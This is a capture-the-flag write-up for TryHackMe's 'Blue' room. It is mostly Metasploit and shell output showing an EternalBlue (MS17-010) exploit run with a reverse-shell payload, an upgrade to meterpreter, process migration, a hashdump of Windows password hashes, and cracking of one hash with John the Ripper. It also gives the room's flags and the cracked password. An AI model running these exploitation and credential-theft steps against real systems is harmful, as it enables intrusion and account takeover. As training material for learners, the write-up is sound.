---
date: 6/8/2025 00.00
layout: post
title: Blue
subtitle: Blue for TyHackMe Writeup.
description: >-
  in this blog i've explained how to root Blue from TryHackMe
image: https://tryhackme-images.s3.amazonaws.com/room-icons/7717bbc69c486931e503a74f3192a4d8.gif
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/7717bbc69c486931e503a74f3192a4d8.gif
category: tryhackme
tags:
  - tryhackme
  - injection
author: Mustafa Eltayeb
paginate: true
---
# Room Name [Blue](https://tryhackme.com/room/blue "Blue")
This room [Blue On TryHackMe] will cover active recon, hack into a Windows machine, leveraging common misconfigurations issues 
---
# Objective of room
This room will cover 
1. hack into a Windows machine
2. leveraging common misconfigurations issues

---

# RECON 

---

## Nmap

---

### first scan 

>**nmap --min-rate 10000  -p- 10.10.54.33**

### Result

```js
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

`nmap` found three standard Windows ports in `RPC (135)`, `NetBios (139)`, and `SMB (445)` 

### Advanced Scan

>**nmap -p 445,135,139 --script vuln 10.10.54.33**

```js
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
```

`Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)`

### Using MetaSploit To Gain Access

```js
msf > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2 
```

### Use 0 

```js 
msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://do
                                             cs.metasploit.com/docs/using-metas
                                             ploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to u
                                             se for authentication. Only affect
                                             s Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 tar
                                             get machines.
   SMBPass                         no        (Optional) The password for the sp
                                             ecified username
   SMBUser                         no        (Optional) The username to authent
                                             icate as
   VERIFY_ARCH    true             yes       Check if remote architecture match
                                             es exploit Target. Only affects Wi
                                             ndows Server 2008 R2, Windows 7, W
                                             indows Embedded Standard 7 target
                                             machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit
                                              Target. Only affects Windows Serv
                                             er 2008 R2, Windows 7, Windows Emb
                                             edded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thre
                                        ad, process, none)
   LHOST     192.168.1.4      yes       The listen address (an interface may be
                                         specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Let's Set `RHOST` to our target machine and run

```js
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhsots 10.10.155.206
[!] Unknown datastore option: rhsots. Did you mean RHOSTS?
rhsots => 10.10.155.206
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.155.206
rhosts => 10.10.155.206
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.9.49:4444 
[*] 10.10.155.206:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.155.206:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.155.206:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.155.206:445 - The target is vulnerable.
[*] 10.10.155.206:445 - Connecting to target for exploitation.
[+] 10.10.155.206:445 - Connection established for exploitation.
[+] 10.10.155.206:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.155.206:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.155.206:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.155.206:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.155.206:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.155.206:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.155.206:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.155.206:445 - Sending all but last fragment of exploit packet
[*] 10.10.155.206:445 - Starting non-paged pool grooming
[+] 10.10.155.206:445 - Sending SMBv2 buffers
[+] 10.10.155.206:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.155.206:445 - Sending final SMBv2 buffers.
[*] 10.10.155.206:445 - Sending last fragment of exploit packet!
[*] 10.10.155.206:445 - Receiving response from exploit packet
[+] 10.10.155.206:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.155.206:445 - Sending egg to corrupted connection.
[*] 10.10.155.206:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.155.206
[+] 10.10.155.206:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.155.206:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.155.206:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Command shell session 1 opened (10.10.9.49:4444 -> 10.10.155.206:49251) at 2025-08-06 11:02:56 +0100


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

## Now We Gain Access

> **ctrl + z to save session** 

```js
C:\>^Z
Background session 1? [y/N]  y
```

## Time to convert shell to meterpreter shell 

>**use post/multi/manage/shell_to_meterpreter**

### Now I gain meterpreter shell:

```js
msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.9.49:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.155.206
[*] Stopping exploit/multi/handler
[*] Meterpreter session 2 opened (10.10.9.49:4433 -> 10.10.155.206:49268) at 2025-08-06 11:17:59 +0100

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                  Information            Connection
  --  ----  ----                  -----------            ----------
  1         shell x64/windows     Shell Banner: Microso  10.10.9.49:4444 -> 10
                                  ft Windows [Version 6  .10.155.206:49251 (10
                                  .1.7601] -----         .10.155.206)
  2         meterpreter x64/wind  NT AUTHORITY\SYSTEM @  10.10.9.49:4433 -> 10
            ows                    JON-PC                .10.155.206:49265 (10
                                                         .10.155.206)
  

msf6 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > ls
Listing: C:\
============

Mode            Size   Type  Last modified            Name
----            ----   ----  -------------            ----
040777/rwxrwxr  0      dir   2018-12-13 03:13:36 +00  $Recycle.Bin
wx                           00
040777/rwxrwxr  0      dir   2009-07-14 06:08:56 +01  Documents and Settings
wx                           00
040777/rwxrwxr  0      dir   2009-07-14 04:20:08 +01  PerfLogs
wx                           00
040555/r-xr-xr  4096   dir   2019-03-17 22:22:01 +00  Program Files
-x                           00
040555/r-xr-xr  4096   dir   2019-03-17 22:28:38 +00  Program Files (x86)
-x                           00
040777/rwxrwxr  4096   dir   2019-03-17 22:35:57 +00  ProgramData
wx                           00
040777/rwxrwxr  0      dir   2018-12-13 03:13:22 +00  Recovery
wx                           00
040777/rwxrwxr  4096   dir   2025-08-06 10:24:39 +01  System Volume Informatio
wx                           00                       n
040555/r-xr-xr  4096   dir   2018-12-13 03:13:28 +00  Users
-x                           00
040777/rwxrwxr  16384  dir   2025-08-06 10:00:04 +01  Windows
wx                           00
100666/rw-rw-r  24     fil   2019-03-17 19:27:21 +00  flag1.txt
w-                           00
000000/-------  0      fif   1970-01-01 01:00:00 +01  hiberfil.sys
--                           00
000000/-------  0      fif   1970-01-01 01:00:00 +01  pagefile.sys
--                           00
meterpreter > 
```

## After Gaining Meterpreter Shell, I Will Move My Process ID to Another One with a Longer Lifetime

1. >ps
2. Choose Process Id
3. >migrate <Process Id>

```js
meterpreter > ps

Process List
============

 PID   PPID  Name         Arch  Session  User               Path
 ---   ----  ----         ----  -------  ----               ----
 0     0     [System Pro
             cess]
 4     0     System       x64   0
 416   4     smss.exe     x64   0        NT AUTHORITY\SYST  \SystemRoot\System
                                         EM                 32\smss.exe
 472   684   svchost.exe  x64   0        NT AUTHORITY\SYST
                                         EM
 544   492   csrss.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\system3
                                         EM                 2\csrss.exe
 564   684   svchost.exe  x64   0        NT AUTHORITY\SYST
                                         EM
 592   492   wininit.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\system3
  ...........................................................................
             er.exe                      EM
 3036  752   powershell.  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
             exe                         EM                 2\WindowsPowerShel
                                                            l\v1.0\powershell.
                                                            exe

meterpreter > migrate 592
[*] Migrating from 2772 to 592...
[*] Migration completed successfully.
meterpreter >
```

## Get Users Hashes

```js
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter > 
```

### Crack User Hashes

```js 
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.4 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ ~ echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hash.txt
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.4 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ ~ john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)
1g 0:00:00:07 DONE (2025-08-06 11:27) 0.1377g/s 1405Kp/s 1405Kc/s 1405KC/s alr1979..alpus
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.4 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ ~ 
```

## The Password for Jon is `alqfna22`

## Time to Get All Flags

### flag1 in C Directory:

```js
meterpreter > pwd
C:\
meterpreter > cat flag1.txt
`flag{access_the_machine}`
```

### flag2 in C:\Windows\System32\config\SAM:

```js
meterpreter > cd Windows\\System32\\config\\
meterpreter > ls
Listing: C:\Windows\System32\config
===================================

Mode            Size      Type  Last modified           Name
----            ----      ----  -------------           ----
100666/rw-rw-r  28672     fil   2018-12-12 23:00:40 +0  BCD-Template
w-                              000
100666/rw-rw-r  25600     fil   2018-12-12 23:00:40 +0  BCD-Template.LOG
w-                              000
100666/rw-rw-r  18087936  fil   2025-08-06 10:11:03 +0  COMPONENTS
w-                              100
100666/rw-rw-r  1024      fil   2011-04-12 09:32:10 +0  COMPONENTS.LOG
w-                              100
100666/rw-rw-r  13312     fil   2025-08-06 10:11:03 +0  COMPONENTS.LOG1
w-                              100
100666/rw-rw-r  0         fil   2009-07-14 03:34:08 +0  COMPONENTS.LOG2
w-                              100
100666/rw-rw-r  1048576   fil   2025-08-06 09:45:22 +0  COMPONENTS{016888b8-6c
w-                              100                     6f-11de-8d1d-001e0bcde
                                                        3ec}.TxR.0.regtrans-ms
100666/rw-rw-r  1048576   fil   2025-08-06 09:45:22 +0  COMPONENTS{016888b8-6c
w-                              100                     6f-11de-8d1d-001e0bcde
                                                        3ec}.TxR.1.regtrans-ms
100666/rw-rw-r  1048576   fil   2025-08-06 09:45:22 +0  COMPONENTS{016888b8-6c
w-                              100                     6f-11de-8d1d-001e0bcde
                                                        3ec}.TxR.2.regtrans-ms
100666/rw-rw-r  65536     fil   2025-08-06 09:45:22 +0  COMPONENTS{016888b8-6c
w-                              100                     6f-11de-8d1d-001e0bcde
                                                        3ec}.TxR.blf
100666/rw-rw-r  65536     fil   2018-12-13 03:20:57 +0  COMPONENTS{016888b9-6c
w-                              000                     6f-11de-8d1d-001e0bcde
                                                        3ec}.TM.blf
100666/rw-rw-r  524288    fil   2018-12-13 03:20:57 +0  COMPONENTS{016888b9-6c
w-                              000                     6f-11de-8d1d-001e0bcde
                                                        3ec}.TMContainer000000
                                                        00000000000001.regtran
                                                        s-ms
100666/rw-rw-r  524288    fil   2009-07-14 06:01:27 +0  COMPONENTS{016888b9-6c
w-                              100                     6f-11de-8d1d-001e0bcde
                                                        3ec}.TMContainer000000
                                                        00000000000002.regtran
                                                        s-ms
100666/rw-rw-r  262144    fil   2025-08-06 10:18:01 +0  DEFAULT
w-                              100
100666/rw-rw-r  1024      fil   2011-04-12 09:32:10 +0  DEFAULT.LOG
w-                              100
100666/rw-rw-r  177152    fil   2025-08-06 10:18:01 +0  DEFAULT.LOG1
w-                              100
100666/rw-rw-r  0         fil   2009-07-14 03:34:08 +0  DEFAULT.LOG2
w-                              100
100666/rw-rw-r  65536     fil   2019-03-17 22:22:17 +0  DEFAULT{016888b5-6c6f-
w-                              000                     11de-8d1d-001e0bcde3ec
                                                        }.TM.blf
100666/rw-rw-r  524288    fil   2019-03-17 22:22:17 +0  DEFAULT{016888b5-6c6f-
w-                              000                     11de-8d1d-001e0bcde3ec
                                                        }.TMContainer000000000
                                                        00000000001.regtrans-m
                                                        s
100666/rw-rw-r  524288    fil   2019-03-17 22:22:17 +0  DEFAULT{016888b5-6c6f-
w-                              000                     11de-8d1d-001e0bcde3ec
                                                        }.TMContainer000000000
                                                        00000000002.regtrans-m
                                                        s
040777/rwxrwxr  0         dir   2009-07-14 03:34:57 +0  Journal
wx                              100
040777/rwxrwxr  4096      dir   2025-08-06 10:17:49 +0  RegBack
wx                              100
100666/rw-rw-r  262144    fil   2019-03-17 20:05:08 +0  SAM
w-                              000
100666/rw-rw-r  1024      fil   2011-04-12 09:32:10 +0  SAM.LOG
w-                              100
100666/rw-rw-r  21504     fil   2019-03-17 22:39:12 +0  SAM.LOG1
w-                              000
100666/rw-rw-r  0         fil   2009-07-14 03:34:08 +0  SAM.LOG2
w-                              100
100666/rw-rw-r  65536     fil   2019-03-17 22:22:17 +0  SAM{016888c1-6c6f-11de
w-                              000                     -8d1d-001e0bcde3ec}.TM
                                                        .blf
100666/rw-rw-r  524288    fil   2019-03-17 22:22:17 +0  SAM{016888c1-6c6f-11de
w-                              000                     -8d1d-001e0bcde3ec}.TM
                                                        Container0000000000000
                                                        0000001.regtrans-ms
100666/rw-rw-r  524288    fil   2019-03-17 22:22:17 +0  SAM{016888c1-6c6f-11de
w-                              000                     -8d1d-001e0bcde3ec}.TM
                                                        Container0000000000000
                                                        0000002.regtrans-ms
100666/rw-rw-r  262144    fil   2025-08-06 10:10:38 +0  SECURITY
w-                              100
100666/rw-rw-r  1024      fil   2011-04-12 09:32:10 +0  SECURITY.LOG
w-                              100
100666/rw-rw-r  21504     fil   2025-08-06 10:10:38 +0  SECURITY.LOG1
w-                              100
100666/rw-rw-r  0         fil   2009-07-14 03:34:08 +0  SECURITY.LOG2
w-                              100
100666/rw-rw-r  65536     fil   2019-03-17 22:22:17 +0  SECURITY{016888c5-6c6f
w-                              000                     -11de-8d1d-001e0bcde3e
                                                        c}.TM.blf
100666/rw-rw-r  524288    fil   2019-03-17 22:22:17 +0  SECURITY{016888c5-6c6f
w-                              000                     -11de-8d1d-001e0bcde3e
                                                        c}.TMContainer00000000
                                                        000000000001.regtrans-
                                                        ms
100666/rw-rw-r  524288    fil   2019-03-17 22:22:17 +0  SECURITY{016888c5-6c6f
w-                              000                     -11de-8d1d-001e0bcde3e
                                                        c}.TMContainer00000000
                                                        000000000002.regtrans-
                                                        ms
100666/rw-rw-r  40632320  fil   2025-08-06 11:34:09 +0  SOFTWARE
w-                              100
100666/rw-rw-r  1024      fil   2011-04-12 09:32:10 +0  SOFTWARE.LOG
w-                              100
100666/rw-rw-r  262144    fil   2025-08-06 11:34:09 +0  SOFTWARE.LOG1
w-                              100
100666/rw-rw-r  0         fil   2009-07-14 03:34:08 +0  SOFTWARE.LOG2
w-                              100
100666/rw-rw-r  65536     fil   2019-03-17 22:21:19 +0  SOFTWARE{016888c9-6c6f
w-                              000                     -11de-8d1d-001e0bcde3e
                                                        c}.TM.blf
100666/rw-rw-r  524288    fil   2019-03-17 22:21:19 +0  SOFTWARE{016888c9-6c6f
w-                              000                     -11de-8d1d-001e0bcde3e
                                                        c}.TMContainer00000000
                                                        000000000001.regtrans-
                                                        ms
100666/rw-rw-r  524288    fil   2019-03-17 22:21:19 +0  SOFTWARE{016888c9-6c6f
w-                              000                     -11de-8d1d-001e0bcde3e
                                                        c}.TMContainer00000000
                                                        000000000002.regtrans-
                                                        ms
100666/rw-rw-r  12582912  fil   2025-08-06 11:44:34 +0  SYSTEM
w-                              100
100666/rw-rw-r  1024      fil   2011-04-12 09:32:06 +0  SYSTEM.LOG
w-                              100
100666/rw-rw-r  262144    fil   2025-08-06 11:44:34 +0  SYSTEM.LOG1
w-                              100
100666/rw-rw-r  0         fil   2009-07-14 03:34:08 +0  SYSTEM.LOG2
w-                              100
100666/rw-rw-r  65536     fil   2019-03-17 22:21:22 +0  SYSTEM{016888cd-6c6f-1
w-                              000                     1de-8d1d-001e0bcde3ec}
                                                        .TM.blf
100666/rw-rw-r  524288    fil   2019-03-17 22:21:22 +0  SYSTEM{016888cd-6c6f-1
w-                              000                     1de-8d1d-001e0bcde3ec}
                                                        .TMContainer0000000000
                                                        0000000001.regtrans-ms
100666/rw-rw-r  524288    fil   2019-03-17 22:21:22 +0  SYSTEM{016888cd-6c6f-1
w-                              000                     1de-8d1d-001e0bcde3ec}
                                                        .TMContainer0000000000
                                                        0000000002.regtrans-ms
040777/rwxrwxr  4096      dir   2018-12-12 23:03:05 +0  TxR
wx                              000
100666/rw-rw-r  34        fil   2019-03-17 19:32:48 +0  flag2.txt
w-                              000
040777/rwxrwxr  4096      dir   2010-11-21 02:41:37 +0  systemprofile
wx                              000

meterpreter > cat flag2.txt
`flag{sam_database_elevated_access}`
```

### flag3 in C:\users\jon\Documents:

```js
meterpreter > pwd
C:\users\jon\Documents
meterpreter > cat flag3.txt
`flag{admin_documents_can_be_valuable}`
```

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>